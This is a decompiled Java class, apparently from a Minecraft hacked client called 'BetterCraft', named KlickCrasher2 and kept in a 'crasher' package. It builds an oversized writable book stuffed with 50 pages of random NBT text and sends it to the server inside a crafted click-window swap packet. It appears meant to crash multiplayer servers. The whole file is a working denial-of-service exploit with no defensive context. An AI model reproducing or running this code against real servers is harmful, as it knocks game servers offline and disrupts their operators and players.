// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cc;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import java.util.Random;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.inventory.ClickType;
import net.minecraft.client.Minecraft;

public class KlickCrasher2
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketClickWindow(1, 9, 0, ClickType.SWAP, bigBook(), (short)157));
    }
    
    public static ItemStack bigBook() {
        final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
        final NBTTagCompound bookCompound = new NBTTagCompound();
        bookCompound.setString("author", String.valueOf(new Random().nextInt(99)));
        bookCompound.setString("title", String.valueOf(new Random().nextInt(99)));
        final NBTTagList pageList = new NBTTagList();
        final String pageText = String.valueOf(new Random().nextInt(999999999));
        for (int page = 0; page < 50; ++page) {
            pageList.appendTag(new NBTTagString(pageText));
        }
        bookCompound.setTag("pages", pageList);
        itemStack.setTagCompound(bookCompound);
        return itemStack;
    }
}
